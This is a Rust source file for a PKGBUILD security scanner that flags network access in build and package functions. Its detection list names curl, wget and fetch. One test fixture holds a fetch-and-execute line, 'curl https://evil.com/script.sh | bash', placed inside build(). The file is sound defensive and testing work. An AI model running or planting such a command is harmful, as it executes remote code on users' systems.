//! Pattern-based analyzer using the rule engine

use super::SecurityAnalyzer;
use crate::error::Result;
use crate::rules::RuleEngine;
use crate::types::{AnalysisContext, Category, FileType, Finding, Location, Severity};
use async_trait::async_trait;
use std::sync::Arc;

/// Analyzer that uses pattern matching from the rule engine
pub struct PatternAnalyzer {
    rule_engine: Arc<RuleEngine>,
}

impl PatternAnalyzer {
    /// Create a new pattern analyzer
    pub fn new(rule_engine: Arc<RuleEngine>) -> Self {
        Self { rule_engine }
    }
}

#[async_trait]
impl SecurityAnalyzer for PatternAnalyzer {
    async fn analyze(&self, context: &AnalysisContext) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        // Analyze PKGBUILD content
        let pkgbuild_matches =
            self.rule_engine
                .match_content(&context.pkgbuild.raw_content, FileType::Pkgbuild);

        for rule_match in pkgbuild_matches {
            if let Some(rule) = self.rule_engine.get_rule(&rule_match.rule_id) {
                findings.push(Finding {
                    id: rule.id.clone(),
                    severity: rule.severity,
                    category: rule.category.clone(),
                    title: rule.name.clone(),
                    description: rule.description.clone(),
                    location: Location {
                        file: context.file_path.clone(),
                        line: Some(rule_match.line),
                        column: Some(rule_match.column),
                        snippet: Some(rule_match.context.clone()),
                    },
                    recommendation: rule.recommendation.clone(),
                    cwe_id: rule.cwe_id.clone(),
                    metadata: serde_json::json!({
                        "matched_text": rule_match.matched_text,
                    }),
                });
            }
        }

        // Analyze install script if present
        if let Some(ref install_script) = context.install_script {
            let script_matches = self
                .rule_engine
                .match_content(&install_script.content, FileType::InstallScript);

            for rule_match in script_matches {
                if let Some(rule) = self.rule_engine.get_rule(&rule_match.rule_id) {
                    findings.push(Finding {
                        id: rule.id.clone(),
                        severity: rule.severity,
                        category: rule.category.clone(),
                        title: format!("{} (install script)", rule.name),
                        description: rule.description.clone(),
                        location: Location {
                            file: install_script.path.clone(),
                            line: Some(rule_match.line),
                            column: Some(rule_match.column),
                            snippet: Some(rule_match.context.clone()),
                        },
                        recommendation: rule.recommendation.clone(),
                        cwe_id: rule.cwe_id.clone(),
                        metadata: serde_json::json!({
                            "matched_text": rule_match.matched_text,
                            "in_install_script": true,
                        }),
                    });
                }
            }
        }

        // Analyze function bodies for specific patterns
        for (func_name, func_body) in &context.pkgbuild.functions {
            // Check for suspicious patterns in build/package functions
            if func_name == "build" || func_name == "package" || func_name.starts_with("package_") {
                let func_findings = self.analyze_function(context, func_name, func_body)?;
                findings.extend(func_findings);
            }
        }

        Ok(findings)
    }

    fn name(&self) -> &str {
        "pattern"
    }
}

impl PatternAnalyzer {
    /// Analyze a specific function for security issues
    fn analyze_function(
        &self,
        context: &AnalysisContext,
        func_name: &str,
        func_body: &crate::parser::FunctionBody,
    ) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        // Check for network access in build functions
        if func_name == "build" || func_name.starts_with("package") {
            let network_patterns = [
                ("curl", "Network access in build function"),
                ("wget", "Network access in build function"),
                ("fetch", "Network access in build function"),
            ];

            for (pattern, message) in &network_patterns {
                if func_body.content.contains(pattern)
                    && !func_body.content.contains(&format!("# {}", pattern))
                {
                    // Check if it's actually a download command (not a variable)
                    if func_body.content.contains(&format!("{} ", pattern))
                        || func_body.content.contains(&format!("${}", pattern))
                    {
                        findings.push(Finding {
                            id: format!("FUNC-{}", pattern.to_uppercase()),
                            severity: Severity::High,
                            category: Category::NetworkSecurity,
                            title: message.to_string(),
                            description: format!(
                                "Function '{}' contains network access command '{}'",
                                func_name, pattern
                            ),
                            location: Location {
                                file: context.file_path.clone(),
                                line: Some(func_body.line_start),
                                column: None,
                                snippet: None,
                            },
                            recommendation:
                                "Network access should happen in source= array, not build functions"
                                    .to_string(),
                            cwe_id: None,
                            metadata: serde_json::json!({
                                "function": func_name,
                                "pattern": pattern,
                            }),
                        });
                    }
                }
            }
        }

        Ok(findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::{StaticParser, PkgbuildParser};
    use crate::types::ScanConfig;
    use std::path::PathBuf;

    fn create_test_context(pkgbuild_content: &str) -> AnalysisContext {
        let parser = StaticParser::new();
        let pkgbuild = parser.parse(pkgbuild_content).unwrap();

        AnalysisContext {
            pkgbuild,
            install_script: None,
            config: ScanConfig::default(),
            file_path: PathBuf::from("PKGBUILD"),
        }
    }

    #[tokio::test]
    async fn test_detect_curl_bash() {
        let rule_engine = Arc::new(RuleEngine::default());
        let analyzer = PatternAnalyzer::new(rule_engine);

        let context = create_test_context(r#"
pkgname=test
pkgver=1.0
pkgrel=1
build() {
    curl https://evil.com/script.sh | bash
}
"#);

        let findings = analyzer.analyze(&context).await.unwrap();
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.id == "DLE-001"));
    }

    #[tokio::test]
    async fn test_clean_pkgbuild() {
        let rule_engine = Arc::new(RuleEngine::default());
        let analyzer = PatternAnalyzer::new(rule_engine);

        let context = create_test_context(r#"
pkgname=test
pkgver=1.0
pkgrel=1
source=("https://example.com/test.tar.gz")
sha256sums=('abc123')
build() {
    make
}
package() {
    make DESTDIR="$pkgdir" install
}
"#);

        let findings = analyzer.analyze(&context).await.unwrap();
        // Should have no critical findings
        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
    }
}
